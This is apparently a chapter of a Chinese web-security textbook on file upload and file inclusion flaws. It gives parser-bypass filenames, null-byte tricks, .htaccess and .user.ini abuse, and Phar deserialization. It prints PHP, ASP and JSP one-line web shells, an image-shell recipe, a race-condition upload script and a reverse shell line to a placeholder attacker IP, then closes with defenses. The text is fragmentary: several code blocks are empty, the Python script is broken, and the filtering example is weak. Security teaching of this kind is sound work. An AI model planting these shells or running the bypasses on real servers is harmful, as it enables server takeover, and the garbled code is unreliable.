# 第七章 文件上传与包含漏洞

## 7.1 文件上传漏洞概述

### 7.1.1 什么是文件上传漏洞

文件上传漏洞是指Web应用程序允许用户上传文件，但没有对上传的文件进行充分的验证和过滤，导致攻击者可以上传恶意文件（如Web Shell），从而控制服务器。

文件上传漏洞是Web安全中最直接、最危险的漏洞之一，因为它可以直接导致服务器被入侵。

**文件上传漏洞的本质**
文件上传漏洞的本质是**上传的文件可以被当作脚本解析执行**。如果上传的文件是PHP、ASP、JSP等脚本文件，并且可以被Web服务器解析执行，那么攻击者就可以执行任意代码。

### 7.1.2 文件上传漏洞的危害

1. **获取服务器控制权**：上传Web Shell，执行任意命令
2. **数据窃取**：读取服务器敏感文件
3. **权限提升**：获取更高权限，控制整个系统
4. **内网渗透**：以服务器为跳板，攻击内网
5. **网站篡改**：修改网站内容，传播恶意信息
6. **勒索攻击**：加密服务器数据，勒索赎金
7. **DDoS攻击**：将服务器作为DDoS肉鸡
8. **黑帽SEO**：利用服务器做站群、发垃圾邮件

### 7.1.3 文件上传漏洞的分类

| 类型 | 说明 |
|-----|------|
| 前端验证绕过 | 只在前端验证，后端未验证 |
| 后端验证绕过 | 后端验证不严格 |
| 白名单绕过 | 白名单配置不当 |
| 黑名单绕过 | 黑名单不完整 |
| 文件类型绕过 | MIME类型验证绕过 |
| 文件内容绕过 | 文件内容检测绕过 |
| 解析漏洞 | 服务器解析漏洞利用 |
| 条件竞争 | 上传后删除前被访问 |
| 二次渲染 | 图片二次渲染绕过 |

## 7.3 前端验证绕过

### 7.3.1 JavaScript验证绕过

很多网站只在前端使用JavaScript验证文件类型，后端没有验证。

**示例代码**
```javascript
function checkFile() {
    var file = document.getElementById('file').value;
    var ext = file.substring(file.lastIndexOf('.') + 1);
    if (ext != 'jpg' && ext != 'png' && ext != 'gif') {
        alert('只允许上传图片文件！');
        return false;
    }
    return true;
}
```

**绕过方法**

1. **禁用JavaScript**：浏览器禁用JavaScript，直接上传恶意文件
2. **修改前端代码**：使用浏览器开发者工具删除或修改验证函数
3. **使用Burp Suite**：上传合法文件，拦截请求修改文件名和内容
4. **使用控制台**：在控制台修改验证函数
5. **删除onsubmit事件**：删除表单的onsubmit事件

**Burp Suite绕过步骤**
1. 准备一个合法的图片文件（如test.jpg）
2. 开启Burp Suite拦截
3. 上传文件
4. 在Burp中修改filename为shell.php
5. 修改文件内容为PHP代码
6. 发送请求

### 7.3.2 实战案例：头像上传前端验证绕过

**场景描述**
某网站上传头像功能只在前端验证文件类型。

**绕过步骤**
1. 准备PHP文件：shell.php
```php
<?php @eval($_POST['cmd']); ?>
```

2. 修改为合法文件名：shell.jpg

3. 使用Burp Suite拦截上传请求，修改：
```
filename="shell.php"
Content-Type: application/octet-stream → image/jpeg
```

4. 发送请求，成功上传PHP文件

5. 访问上传的文件，确认是否解析执行


**常见的图片MIME类型**

- image/gif
- image/bmp
- image/webp
- image/svg+xml

### 7.4.2 文件扩展名验证绕过

**黑名单绕过**
黑名单验证是指禁止某些扩展名的文件上传。但黑名单通常不完整，可以绕过。

```
.php → .php5, .php7, .phtml, .phps, .pht, .php3, .php4
.asp → .asa, .cer, .cdx, .asp, .aspx
.jsp → .jspx, .jspa, .jspf, .jswf
.php → .PHP, .pHp, .PhP（大小写）
```

**Apache的特殊解析**
```
shell.php.jpg  # 某些配置下会被解析为PHP
shell.phtml  # 某些配置下会被解析为PHP
```

**白名单绕过**
白名单验证是指只允许某些扩展名的文件上传。白名单比黑名单安全，但也有绕过方法：

```
shell.php%00.jpg  # 00截断（PHP < 5.3.4
shell.php.jpg  # Apache解析漏洞
/..%00/shell.php  # 路径截断
```

**IIS 6.0解析漏洞**
```
shell.asp;.jpg  # 分号截断，解析为ASP
/asp/shell.jpg  # 目录解析，目录名为.asp
```

**Nginx解析漏洞**
```
shell.jpg/.php  # 路径解析漏洞
shell.jpg%00.php  # 00截断
```

### 7.4.3 文件内容验证绕过

**文件头检测绕过**
很多网站只检测文件头（前几个字节），可以构造图片马绕过。

**制作图片马**
```bash
# 方法1：直接拼接（Windows）
copy /b image.jpg + shell.php image_shell.jpg

# 方法2：直接拼接（Linux）
cat image.jpg shell.php > image_shell.jpg

# 方法3：使用exiftool写入注释
exiftool -Comment="<?php @eval($_POST['cmd']); ?>" image.jpg

# 方法4：手动添加文件头
# JPEG文件头：FF D8 FF
# PNG文件头：89 50 4E 47
# GIF文件头：47 49 46 38
```

**文件头+PHP代码**
```php
# JPEG文件头 + PHP代码
\xFF\xD8\xFF<?php @eval($_POST['cmd']); ?>
```

**二次渲染绕过**
一些网站会对上传的图片进行二次渲染（重新生成缩略图、压缩等），这时简单的图片马会被清除。绕过方法：

1. **寻找渲染后仍保留的区域**：如EXIF信息、注释等
2. **利用图片格式特性**：如PNG的tEXt块
3. **上传原图**：如果只渲染缩略图，可以访问原图
4. **SVG文件**：SVG是XML格式，可以嵌入脚本

**GIF图片马制作技巧**
GIF图片的某些字段可能在二次渲染后保留，比如注释字段。

### 7.4.4 条件竞争绕过

有些网站会先将文件上传到服务器，然后检查是否合法，如果不合法就删除。这就存在条件竞争漏洞。

**利用方法**
1. 上传文件
2. 在文件被删除前访问它
3. 如果访问成功，就可以执行代码

**自动化利用脚本**
```python
import requests
import threading

def upload():
    while True:
        files = {'file': ('shell.php', '<?php @eval($_POST["cmd"]); ?>')
        requests.post('http://example.com/upload.php', files=files)

def access():
    while True:
        r = requests.get('http://example.com/uploads/shell.php')
        if r.status_code == 200:
            print('Success!)
            break

# 多线程同时上传和访问
```

**条件竞争的其他场景**

1. **上传后移动文件前**：文件先上传到临时目录，验证后移动到目标目录，中间有时间窗口
2. **图片处理前**：上传后先处理图片（生成缩略图、水印等），处理前文件是完整的
3. **文件名冲突处理**：文件名冲突时的处理逻辑可能存在漏洞
4. **日志记录与删除**：删除前会被记录或处理

**Burp Suite条件竞争测试**
使用Burp Intruder的Pitchfork模式，同时发送多个上传请求和访问请求。

### 7.4.6 .htaccess文件利用

如果可以上传.htaccess文件，可以通过配置让Apache解析其他文件为PHP。

**方法1：AddType**
```apache
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .gif

```

**方法2：AddHandler**
```apache

```

**方法3：php_value**
```apache

# 然后.htaccess文件本身写入PHP代码
```

### 7.4.7 user.ini文件利用

在PHP CGI/FastCGI模式下，可以利用.user.ini文件。

**.user.ini内容**
```ini
auto_prepend_file = shell.jpg
auto_append_file = shell.jpg
```

利用步骤：
1. 上传.user.ini文件
2. 上传shell.jpg（包含PHP代码）
3. 访问同目录下的任意PHP文件
4. 自动包含shell.jpg

### 7.4.8 图片二次渲染深入

**PNG图片二次渲染绕过**
PNG文件由多个数据块（chunk）组成，某些块可能在二次渲染后保留：
- IHDR：文件头
- tEXt：文本信息
- iTXt：国际文本
- zTXt：压缩文本
- IDAT：图像数据
- IEND：文件结束

可以把PHP代码写入tEXt块，二次渲染后可能保留。

**JPG二次渲染绕过**
JPG的EXIF信息、注释信息可能保留。

**GIF二次渲染绕过**
GIF的注释块可能保留。

## 7.5 解析漏洞利用

### 7.5.1 Apache解析漏洞

Apache的解析规则是从右向左解析扩展名，如果最右边的扩展名不认识，就继续向左解析。

**示例**
```
shell.php.jpg  # .jpg不认识，解析.php
shell.php.xxx  # .xxx不认识，解析.php
shell.php.abc.def  # .def不认识，继续向左
```

**利用方法**
1. 上传shell.php.jpg
2. 访问/uploads/shell.php.jpg
3. Apache将其当作PHP解析执行

**Apache AddHandler配置问题**
如果Apache配置了：
```apache
AddHandler application/x-httpd-php .php
```
那么只有.php后缀的文件才会被解析。

但如果配置了：
```apache
AddType application/x-httpd-php .php
```
则可能存在解析漏洞。

### 7.5.2 IIS解析漏洞

**IIS 6.0**
IIS 6.0有两个著名的解析漏洞：

1. **目录解析**：目录名以.asp结尾，目录下所有文件都按ASP解析
```
/uploads/asp/shell.jpg  # shell.jpg按ASP解析
/uploads/asa/shell.jpg  # shell.jpg按ASP解析
```

2. **文件解析**：文件名包含.asp;
```
shell.asp;.jpg  # 解析为shell.asp
shell.asp;1.jpg   # 解析为shell.asp
```

**IIS 7.0/7.5**
配合PHP-CGI配置问题：
```
shell.jpg/.php  # 在URL后加/.php
shell.jpg/%3f.php
```

**利用方式：
1. 上传shell.jpg（包含PHP代码）
2. 访问/uploads/shell.jpg/.php
3. PHP解析执行

### 7.5.3 Nginx解析漏洞

Nginx的解析漏洞和配置有关：
```
shell.jpg/.php  # 如果配置了fastcgi_pass
shell.jpg%00.php  # 00截断
```

**Nginx配置问题**
```nginx
location ~ \.php$ {
    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index index.php;
    ...
}
```

如果没有正确配置fix_pathinfo=1，可能存在解析漏洞。

**Nginx 文件名逻辑漏洞（CVE-2013-4547）**
```
shell.jpg%00.php  # 空格+00截断
shell.jpg\x20\x00.php
```

### 7.5.4 Tomcat解析漏洞

Tomcat也存在一些解析漏洞：

**JSP解析**
```
shell.jsp;  # 分号
shell.jsp/  # 斜杠
shell.jsp%20  # 空格
shell.jsp%00  # 00截断
```

**WAR包上传**
如果Tomcat管理后台可以上传WAR包，直接部署Web应用。

## 7.6 00截断利用

### 7.6.1 00截断原理

00截断利用URL编码%00或空字节截断文件名。在PHP中，底层使用C语言的字符串处理函数，遇到\0表示字符串结束。

**原理**
```
shell.php%00.jpg
在PHP中，字符串处理到%00会被认为是字符串结束，所以实际文件名是shell.php
```

### 7.6.2 00截断利用

**GET请求**
```
/upload.php?filename=shell.php%00.jpg
```

**POST请求**
使用Burp Suite中修改文件名，在十六进制编辑添加00字节。

**路径截断**
```
/uploads/shell.php%00/
```

### 7.6.3 00截断限制

- PHP 5.3.4之后版本已修复
- 需要magic_quotes_gpc关闭
- 不同服务器可能表现不同
- 取决于文件系统的处理方式

## 7.8 Web Shell详解

### 7.8.1 一句话木马

一句话木马是最常见的Web Shell，体积小，隐蔽性强。

**PHP一句话**
```php
<?php @eval($_POST['cmd']); ?>
<?php assert($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
```

**ASP一句话**
```asp
<%eval request("cmd")%>
<%execute request("cmd")%>
```

**ASPX一句话**
```aspx
<%@ Page Language="Jscript"%>
<%eval(Request.Item["cmd"],"unsafe");%>
```

**JSP一句话**
```jsp
<%
    if(request.getParameter("cmd")!=null){
        Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
%>
```

**变形一句话**
```php
<?php
    $a = "assert";
    $a($_POST['cmd']);
?>

<?php
    $_="";
    $_[+""] = $_="";
?>
```

### 7.8.2 小马

小马通常指功能较少的Web Shell，只有基本的命令执行、文件管理等功能。

免杀Web Shell可以绕过WAF和杀毒软件的检测。

**免杀技巧**

## 7.10 文件包含漏洞概述

### 7.10.1 什么是文件包含漏洞

文件包含漏洞是指Web应用程序允许用户指定包含的文件，但没有对文件路径进行充分的验证，导致攻击者可以包含恶意文件。

文件包含漏洞分两种：本地文件包含（LFI）和远程文件包含（RFI）。

### 7.10.2 文件包含漏洞的原理

PHP中的文件包含函数：
- include()
- require()
- include_once()
- require_once()
- fopen()
- readfile()
- file_get_contents()

当这些函数的参数可控时，就可能存在文件包含漏洞。

**示例代码**
```php
<?php
$file = $_GET['file'];
include($file);
?>
```

### 7.10.3 文件包含漏洞的分类

| 类型 | 说明 | 特点 |
|-----|------|------|
| 本地文件包含（LFI） | 包含本地文件 | 可读取敏感文件 |
| 远程文件包含（RFI） | 包含远程文件 | 可执行任意代码 |

### 7.10.4 文件包含漏洞的危害

1. **读取敏感文件**：配置文件、密码文件、日志文件
2. **执行任意代码**：包含恶意文件执行代码
3. **获取Shell**：包含Web Shell
4. **内网渗透**：读取内网配置
5. **提权辅助**：读取系统配置和密钥

## 7.15 Phar反序列化

### 7.15.1 Phar反序列化原理

Phar文件是PHP的归档文件格式，phar文件中存储着用户自定义的meta-data，这个数据是以序列化的形式存储的。

当使用文件操作函数（如file_exists()、is_dir()、filesize()等）通过phar://伪协议解析phar文件时，会自动反序列化meta-data中的数据，如果这些函数的参数是用户可控的，就可能导致反序列化漏洞。

**触发条件**
1. phar文件可以上传到服务器
2. 存在文件操作函数，参数可控
3. 存在可利用的反序列化POP链

### 7.15.2 哪些函数受影响

- file_exists()
- is_dir()
- is_file()
- fileinode()
- filesize()
- fileperms()
- fileowner()
- filegroup()
- stat()
- filectime()
- fileatime()
- filemtime()
- fopen()
- readfile()
- file_get_contents()
- 等等所有文件操作函数

### 7.15.3 生成Phar文件

```php
<?php
    class TestObject {
    public $data = 'test';
    function __destruct() {
        eval($this->data);
    }
}

@unlink("test.phar");
$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new TestObject();
$o->data = 'phpinfo();';
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

生成的test.phar可以改名为test.jpg上传，然后通过phar://协议触发。

### 7.15.4 利用示例

```php
# 存在漏洞的代码
<?php
    $file = $_GET['file'];
    if (file_exists($file)) {
        echo "文件存在";
    }
?>
```

利用：
```
/check.php?file=phar://test.jpg/test.txt
```

当file_exists()函数解析phar://协议时，会自动反序列化meta-data，触发__destruct()方法，执行代码。

## 7.16 反向Shell与Shell升级

拿到WebShell后，通常需要建立反向Shell，获得更稳定的交互式Shell。

### 7.16.1 反向Shell原理

反向Shell是目标主机主动连接攻击者的主机，攻击者在自己机器上监听端口。

**为什么用反向Shell**
1. 目标在内网，无法直接连接
2. 防火墙只允许出站连接
3. 更隐蔽
4. 更稳定

### 7.16.2 常见反向Shell

**Bash反向Shell**

```bash
nc -c bash 攻击者IP 端口
```

```php
<?php
$ip = '攻击者IP';
```

### 7.20.9 案例9：Phar反序列化实战

**场景描述**

**利用步骤**

```php
<?php
class User {
    public $name;
    function __destruct() {
        eval($this->name);
    }
}

$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$o = new User();
```

## 7.21 文件上传与包含漏洞防护

### 7.21.1 文件上传防护

**1. 白名单验证扩展名**
只允许特定扩展名的文件上传，使用白名单而非黑名单。

**2. 文件内容检测**
- 检查文件头
- 检查文件内容
- 图片二次渲染
- 重新生成图片

**3. 文件重命名**
上传后重命名文件，使用随机文件名。

**4. 存储目录隔离**
- 上传目录不可执行
- 上传目录设置为只读
- 上传目录使用独立域名

**5. 文件权限控制**
- 限制文件读写权限
- 上传文件设置为644权限
- 目录设置为755权限

**6. WAF防护**
部署Web应用防火墙。

**7. 服务器配置**
- 正确配置Web服务器
- 禁用危险的解析规则
- 关闭不必要的功能

**PHP示例代码**
```php
<?php
// 白名单
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);

if (!in_array(strtolower($ext), $allowed_ext)) {
    die('不允许的文件类型');
}

// 检查文件内容
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) {
    die('不允许的文件类型');
}

// 文件重命名
$new_filename = uniqid() . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], './upload/' . $new_filename);

// 上传目录禁止执行PHP
// 在上传目录放.htaccess或配置
```

### 7.21.2 文件包含防护

**1. 禁用远程文件包含**
php.ini设置allow_url_include = Off
allow_url_fopen = Off

**2. 固定文件路径**
不允许用户指定路径，使用固定路径。

**3. 路径过滤**
过滤../、..\\等跳转字符。

**4. 白名单验证**
只允许包含特定文件。

**5. 禁用伪协议**
禁用php://、data://等伪协议。

**6. open_basedir限制**
php.ini设置open_basedir限制访问目录。

**修复示例**
```php
<?php
// 固定文件
$file = $_GET['file'];
$allowed_files = ['home.php', 'about.php', 'contact.php'];
if (!in_array($file, $allowed_files)) {
    die('非法文件');
}
include($file);

// 或者限制目录
$file = $_GET['file'];
$file = str_replace('../', '', $file);
$file = str_replace('..\\', '', $file);
include('./templates/' . $file . '.php');
?>
```
